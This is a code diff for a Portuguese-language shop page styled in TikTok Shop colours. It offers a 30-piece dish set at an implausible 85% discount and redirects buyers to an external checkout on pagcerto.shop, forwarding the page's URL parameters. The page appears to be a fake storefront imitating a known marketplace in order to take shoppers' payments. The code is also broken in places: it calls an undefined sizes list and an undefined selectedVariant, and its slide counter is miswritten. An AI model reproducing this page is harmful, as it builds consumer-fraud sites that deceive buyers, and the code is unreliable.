+<!-- Botões lado direito -->
+<div class="flex items-center gap-2 w-full max-w-[65%]">
+
+    <!-- Botão Adicionar ao carrinho (cinza claro) -->
+  <button type="button" onclick="abrirModal()" class="inline-flex items-center justify-center h-11 px-3 py-2 rounded-lg bg-gray-100 text-gray-900 text-sm font-medium shadow-sm active:scale-[.98] whitespace-nowrap transition-colors duration-200 flex-[1.2]">
+    <span class="text-sm leading-none text-center">Adicionar<br>ao carrinho</span>
+  </button>
+
+  <!-- Botão Comprar com Cupom (COR OFICIAL TIKTOK SHOP) -->
+  <button type="button" onclick="abrirModal()" class="inline-flex items-center justify-center h-12 px-4 py-3 rounded-lg bg-[#FF0050] hover:bg-[#e60049] text-white text-sm font-semibold uppercase tracking-wide shadow-md active:scale-[.98] whitespace-nowrap transition-all duration-200 flex-[1.8]">
+    <span class="text-sm leading-none text-center">Comprar</span>
+  </button>
+</div>
+
+<!-- MODAL PRINCIPAL -->
+<div id="meuModal" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-end justify-center" onclick="fecharModalIfOverlay(event)">
+  <div class="bg-white w-full rounded-t-2xl p-5 relative shadow-xl max-h-screen overflow-y-auto" id="modalContent">
+    
+    <!-- BOTÃO FECHAR -->
+    <button onclick="fecharModal()" class="absolute top-3 right-3 text-gray-500 hover:text-red-600 text-2xl font-bold z-10">×</button>
+    
+    <!-- TOPO: IMAGEM + PREÇO -->
+    <div class="flex items-center mb-5">
+      <img id="productImg" src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw4qux18.webp" alt="Produto" class="w-20 h-20 object-cover rounded-lg mr-3">
+      <div>
+        <div class="text-rose-500 font-bold text-xl"><strong style="padding: 4px 8px; background:#ff0050; color:white; border-radius:8px; font-size:12px;">-85%</strong> R$ 48,59</div>
+        <div class="text-gray-500 line-through text-xs">R$ 589,43</div>
+      </div>
+    </div>
+
+    <!-- CORES -->
+    <h2 class="text-gray-700 font-bold text-sm mb-2">Escolha:</h2>
+    <div id="colors-list" class="grid grid-cols-2 gap-2 mb-5"></div>
+
+    <!-- BOTÃO COMPRAR -->
+    <button id="confirmCheckoutBtn" class="w-full bg-gray-400 text-white font-bold py-3.5 rounded-xl cursor-not-allowed transition-all flex flex-col items-center" disabled>
+      <div class="text-lg">Comprar agora</div>
+      <div class="text-xs opacity-90">Frete grátis</div>
+    </button>
+  </div>
+</div>
+
+<script>
+// ===== 24 CORES COM LINKS INDIVIVUAIS =====
+const colorVariants = [
+  { key: '30 Peças Ryo Maresia Jogo de Pratos e Xícaras Oxford', img: 'https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw4qux18.webp', link: 'https://checkout.pagcerto.shop/VCCL1O8SCIVL' }
+];
+
+let selectedColor = null;
+let selectedSize = true;
+
+// ===== FUNÇÕES MODAL (mantidas iguais) =====
+function abrirModal() {
+  document.getElementById('meuModal').classList.remove('hidden');
+  document.getElementById('modalContent').style.transform = 'translateY(0)';
+  document.body.style.overflow = 'hidden';
+  renderColorOptions();
+  renderSizeOptions();
+  selectedColor = null; selectedSize = null;
+  updateCheckoutButton();
+}
+function fecharModal() {
+  const content = document.getElementById('modalContent');
+  content.style.transform = 'translateY(100%)';
+  setTimeout(() => {
+    document.getElementById('meuModal').classList.add('hidden');
+    document.body.style.overflow = '';
+  }, 300);
+}
+function fecharModalIfOverlay(e) {
+  if (e.target.id === 'meuModal') fecharModal();
+}
+
+// ===== RENDER CORES =====
+function renderColorOptions() {
+  const container = document.getElementById('colors-list');
+  container.innerHTML = '';
+  colorVariants.forEach(v => {
+    const div = document.createElement('div');
+    div.className = 'flex items-center border border-gray-300 rounded-md p-1.5 cursor-pointer hover:shadow-sm transition-all';
+    div.innerHTML = `
+      <img src="${v.img}" class="w-9 h-9 object-cover rounded mr-2">
+      <span class="text-xs font-medium text-gray-800">${v.key}</span>
+    `;
+    div.onclick = () => {
+      document.querySelectorAll('#colors-list > div').forEach(d => d.classList.remove('ring-2', 'ring-rose-500', 'border-rose-500'));
+      div.classList.add('ring-2', 'ring-rose-500', 'border-rose-500');
+      selectedColor = v;
+      document.getElementById('productImg').src = v.img;
+      updateCheckoutButton();
+    };
+    container.appendChild(div);
+  });
+}
+
+// ===== RENDER TAMANHOS =====
+function renderSizeOptions() {
+  const container = document.getElementById('sizes-list');
+  container.innerHTML = '';
+  sizes.forEach(s => {
+    const div = document.createElement('div');
+    div.className = 'border border-gray-300 rounded-lg py-3 text-center cursor-pointer text-sm font-bold hover:shadow-sm transition-all';
+    div.textContent = s.key;
+    div.onclick = () => {
+      document.querySelectorAll('#sizes-list > div').forEach(d => d.classList.remove('ring-2', 'ring-rose-500', 'border-rose-500', 'bg-rose-50'));
+      div.classList.add('ring-2', 'ring-rose-500', 'border-rose-500', 'bg-rose-50');
+      selectedSize = s;
+      updateCheckoutButton();
+    };
+    container.appendChild(div);
+  });
+}
+
+// ===== BOTÃO CHECKOUT COM LINK POR COR =====
+function updateCheckoutButton() {
+  const btn = document.getElementById('confirmCheckoutBtn');
+  if (selectedColor && selectedSize && selectedColor.link) {
+    btn.disabled = false;
+    btn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+    btn.classList.add('bg-rose-500', 'hover:bg-rose-600', 'cursor-pointer');
+    
+    // LINK ESPECÍFICO DE CADA COR + PARÂMETROS OPCIONAIS
+    btn.onclick = () => {
+      const baseLink = selectedColor.link;
+      const finalLink = `${baseLink}?cor=${encodeURIComponent(selectedColor.key)}&tam=${encodeURIComponent(selectedSize.value)}`;
+      window.location.href = finalLink;
+    };
+  } else {
+    btn.disabled = true;
+    btn.classList.add('bg-gray-400', 'cursor-not-allowed');
+    btn.classList.remove('bg-rose-500', 'hover:bg-rose-600');
+    btn.onclick = null;
+  }
+}
+
+// ESC para fechar
+document.addEventListener('keydown', e => e.key === 'Escape' && fecharModal());
+</script>
+<script>
+// ===== FUNÇÃO PARA CAPTURAR PARÂMETROS DA URL =====
+function getUrlParameters() {
+  const params = new URLSearchParams(window.location.search);
+  const paramObj = {};
+  for (const [key, value] of params) {
+    paramObj[key] = value;
+  }
+  return paramObj;
+}
+
+// ===== FUNÇÃO PARA ADICIONAR PARÂMETROS A UMA URL =====
+function appendParamsToUrl(baseUrl, params) {
+  const url = new URL(baseUrl);
+  Object.keys(params).forEach(key => {
+    url.searchParams.append(key, params[key]);
+  });
+  return url.toString();
+}
+
+// ===== MODIFICAÇÃO NA FUNÇÃO goToCheckout =====
+function goToCheckout() {
+  if (!selectedVariant) return;
+
+  // Captura os parâmetros atuais da URL
+  const urlParams = getUrlParameters();
+
+  // Se houver parâmetros, adiciona ao checkout
+  let finalCheckoutUrl = selectedVariant.checkout;
+  if (Object.keys(urlParams).length > 0) {
+    finalCheckoutUrl = appendParamsToUrl(selectedVariant.checkout, urlParams);
+  }
+
+  // Fecha o modal e redireciona
+  fecharModal();
+  window.location.href = finalCheckoutUrl;
+}
+
+// ===== (Opcional) Rastreamento de clique com console.log para debug =====
+console.log('Rastreamento de parâmetros ativado. Parâmetros atuais:', getUrlParameters());
+</script>
+
+  <!-- Seus arquivos JS -->
+  <script src="js/swiper-bundle.min.js"></script>
+  <script src="js/modal.js"></script>
+
+  <script>
+    // INICIALIZAÇÃO DO SWIPER (já existente no seu código)
+    var thumbSwiper = new Swiper(".thumb-swiper", {
+      spaceBetween: 10,
+      slidesPerView: 3,
+      freeMode: true,
+      watchSlidesProgress: true,
+    });
+
+    var mainSwiper = new Swiper(".main-swiper", {
+      rewind: true,
+      spaceBetween: 10,
+      navigation: {
+        nextEl: ".swiper-button-next",
+        prevEl: ".swiper-button-prev",
+      },
+      thumbs: {
+        swiper: thumbSwiper,
+      },
+      on: {
+        slideChange: function () {
+          let current = this.realIndex + 1;
+          if (current > 7) {
+            current = 1;
+            this.slideTo(0);
+          }
+          document.getElementById("counter").textContent = current + "1/7";
         }
+      }
+    });
 
-        function formatNumber(value, delimiter) {
-          // exibe com 2 casas decimais e separador personalizado
-          let formatted = value.toFixed(2);
-          if (delimiter === ",") formatted = formatted.replace(".", ",");
-          return formatted;
+    // INICIALIZAÇÃO DO FEATHER ICONS (já existente)
+    feather.replace();
+
+    // FUNÇÃO TOGGLE DESCRIÇÃO (já existente)
+    (function () {
+      const desc = document.getElementById('descPreview');
+      const btn = document.getElementById('toggleDescBtn');
+
+      btn.addEventListener('click', function () {
+        const isCollapsed = desc.classList.contains('max-h-28');
+        if (isCollapsed) {
+          desc.classList.remove('max-h-28');
+          desc.classList.add('max-h-full');
+          btn.textContent = 'Ver menos';
+          btn.setAttribute('aria-expanded', 'true');
+        } else {
+          desc.classList.add('max-h-28');
+          desc.classList.remove('max-h-full');
+          btn.textContent = 'Ver mais';
+          btn.setAttribute('aria-expanded', 'false');
+          desc.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
       });
-    </script> -->
-    <script src="/js/main.js"></script>
-  </body>
-</html>
+    })();
+
+    // BOTÃO SEGUIR (já existente)
+    const seguirBtn = document.getElementById('seguirBtn');
+    const key = 'seguiu_karla_bella';
+
+    if (localStorage.getItem(key) === '1') {
+      seguirBtn.textContent = 'Seguindo';
+      seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+      seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+    }
+
+    seguirBtn.addEventListener('click', () => {
+      const seguindo = localStorage.getItem(key) === '1';
+      if (seguindo) {
+        localStorage.removeItem(key);
+        seguirBtn.textContent = 'Seguir';
+        seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+        seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+      } else {
+        localStorage.setItem(key, '1');
+        seguirBtn.textContent = 'Seguindo';
+        seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+        seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+      }
+    });
+  </script>
+
+</div></div></div></section></div></div></body></html>
